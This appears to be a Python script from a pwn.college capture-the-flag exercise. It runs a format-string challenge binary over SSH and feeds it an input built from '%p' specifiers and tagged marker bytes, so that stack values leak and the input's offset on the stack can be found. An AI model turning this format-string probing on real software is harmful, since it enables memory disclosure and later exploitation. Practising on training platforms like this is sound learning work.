import subprocess

SSH = [
    "ssh",
    "-i",
    "../key",
    "hacker@dojo.pwn.college",
    "/challenge/babyfmt_level4.1",
]

fmt = ("AAA " + "%p " * 80 + "|end").encode()
chunks = []
for k in range(16):
    chunks.append(f"TAG{k:02d}".encode().ljust(8, b"X"))
payload = fmt + b"".join(chunks)

res = subprocess.run(SSH, input=payload, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
out = res.stdout.decode("latin-1", errors="ignore")

for line in out.splitlines():
    if line.startswith("AAA "):
        print(line)
        break
